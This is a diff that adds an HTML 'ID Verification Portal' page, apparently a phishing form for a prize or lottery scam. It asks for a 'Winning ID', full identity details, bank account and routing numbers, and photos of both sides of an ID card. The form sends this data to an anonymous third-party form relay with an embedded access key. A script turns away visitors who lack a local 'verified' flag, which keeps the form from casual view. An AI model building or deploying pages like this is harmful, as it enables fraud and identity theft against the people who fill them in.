@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ID Verification Portal</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
+  <script>
+    UPLOADCARE_PUBLIC_KEY = '6d89fecba2b18e6e32d2';
+  </script>
+  <script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
+</head>
+<body class="bg-[#fff8f0] min-h-screen flex justify-center items-center p-4">
+
+  <div class="bg-white rounded-3xl shadow-2xl p-8 max-w-3xl w-full">
+    <div class="text-center mb-8">
+      <div class="mx-auto bg-purple-600 w-16 h-16 rounded-full flex items-center justify-center text-white text-3xl font-bold mb-4">ID</div>
+      <h1 class="text-3xl font-bold text-gray-800 mb-2">ID Verification Portal</h1>
+      <p class="text-gray-600">Securely submit your identification details and documents.</p>
+    </div>
+
+    <form id="idForm" action="https://api.web3forms.com/submit" method="POST" class="space-y-6">
+      <input type="hidden" name="access_key" value="678a23d5-c5dc-46e6-abce-d7e16b32e8f1">
+
+      <div class="grid md:grid-cols-2 gap-4">
+        <div>
+          <label class="block font-medium text-gray-700">Full Name</label>
+          <input type="text" name="Full Name" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+        </div>
+
+        <div>
+          <label class="block font-medium text-gray-700">Date of Birth</label>
+          <input type="date" name="Date of Birth" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+        </div>
+
+        <div>
+          <label class="block font-medium text-gray-700">Email Address</label>
+          <input type="email" name="Email" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+        </div>
+
+        <div>
+          <label class="block font-medium text-gray-700">Phone Number</label>
+          <input type="tel" name="Phone Number" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+        </div>
+
+        <div class="md:col-span-2">
+          <label class="block font-medium text-gray-700">Delivery Address</label>
+          <textarea name="Delivery Address" rows="2" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"></textarea>
+        </div>
+
+        <div>
+          <label class="block font-medium text-gray-700">Winning ID</label>
+          <input type="text" name="Winning ID" placeholder="e.g. TFL20258752AF" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+        </div>
+
+        <div>
+          <label class="block font-medium text-gray-700">Bank Name</label>
+          <input type="text" name="Bank Name" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+        </div>
+
+        <div>
+          <label class="block font-medium text-gray-700">Account Name</label>
+          <input type="text" name="Account Name" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+        </div>
+
+        <div>
+          <label class="block font-medium text-gray-700">Account / Routing Number</label>
+          <input type="text" name="Account / Routing Number" required class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300">
+        </div>
+
+        <div class="md:col-span-2">
+          <label class="block font-medium text-gray-700">Special Delivery Note</label>
+          <textarea name="Delivery Note" placeholder="e.g. Call before delivery" rows="2" class="w-full border rounded-lg p-2 focus:ring focus:ring-purple-300"></textarea>
+        </div>
+      </div>
+
+      <div class="border-t pt-4">
+        <h3 class="text-xl font-semibold text-gray-800 mb-3">Upload ID (Front & Back)</h3>
+
+        <div class="flex flex-col md:flex-row md:space-x-4 space-y-4 md:space-y-0">
+          <!-- Front Upload -->
+          <div class="flex-1">
+            <label class="block text-gray-700 font-medium mb-1">Front Side</label>
+            <button type="button" id="uploadFrontBtn" class="bg-purple-600 text-white py-2 px-4 rounded-lg w-full hover:bg-purple-700 transition">Upload Front</button>
+            <div id="frontProgress" class="h-2 bg-gray-200 rounded mt-2 hidden">
+              <div id="frontBar" class="h-2 bg-purple-600 rounded w-0"></div>
+            </div>
+            <input type="hidden" id="frontUrl" name="ID Front">
+          </div>
+
+          <!-- Back Upload -->
+          <div class="flex-1">
+            <label class="block text-gray-700 font-medium mb-1">Back Side</label>
+            <button type="button" id="uploadBackBtn" class="bg-purple-600 text-white py-2 px-4 rounded-lg w-full hover:bg-purple-700 transition">Upload Back</button>
+            <div id="backProgress" class="h-2 bg-gray-200 rounded mt-2 hidden">
+              <div id="backBar" class="h-2 bg-purple-600 rounded w-0"></div>
+            </div>
+            <input type="hidden" id="backUrl" name="ID Back">
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+        <p class="text-sm text-yellow-800">
+          Please ensure your ID is clearly visible and all text is readable. Files should not exceed 10MB each.
+        </p>
+      </div>
+
+      <div class="flex items-start gap-2">
+        <input type="checkbox" required>
+        <p class="text-sm text-gray-600">I confirm that all the information and documents provided are accurate and authentic.</p>
+      </div>
+
+      <button type="submit" class="w-full bg-purple-600 text-white py-3 rounded-lg font-semibold hover:bg-purple-700 transition-all">
+        Submit ID
+      </button>
+    </form>
+  </div>
+
+  <script>
+    function setupUpload(buttonId, inputId, progressId, barId) {
+      const button = document.getElementById(buttonId);
+      const input = document.getElementById(inputId);
+      const progressContainer = document.getElementById(progressId);
+      const progressBar = document.getElementById(barId);
+
+      button.addEventListener('click', () => {
+        // Reset UI
+        button.textContent = "Uploading...";
+        button.classList.remove("bg-green-600");
+        button.classList.add("bg-purple-600");
+        progressContainer.classList.remove("hidden");
+        progressBar.style.width = "0%";
+
+        const dialog = uploadcare.openDialog(null, { imagesOnly: true });
+        dialog.done(file => {
+          file.progress(info => {
+            const percent = Math.round(info.progress * 100);
+            progressBar.style.width = percent + "%";
+            button.textContent = `Uploading... ${percent}%`;
+          });
+          file.done(info => {
+            input.value = info.cdnUrl;
+            progressBar.style.width = "100%";
+            button.textContent = "Uploaded ✓ (Reupload)";
+            button.classList.replace("bg-purple-600", "bg-green-600");
+          });
+        });
+      });
+    }
+
+    setupUpload("uploadFrontBtn", "frontUrl", "frontProgress", "frontBar");
+    setupUpload("uploadBackBtn", "backUrl", "backProgress", "backBar");
+    
+  // Redirect back if not verified
+  const verified = localStorage.getItem("verifiedId");
+  if (!verified) {
+    window.location.href = "thankyou.html";
+  }
+    
+  </script>
+</body>
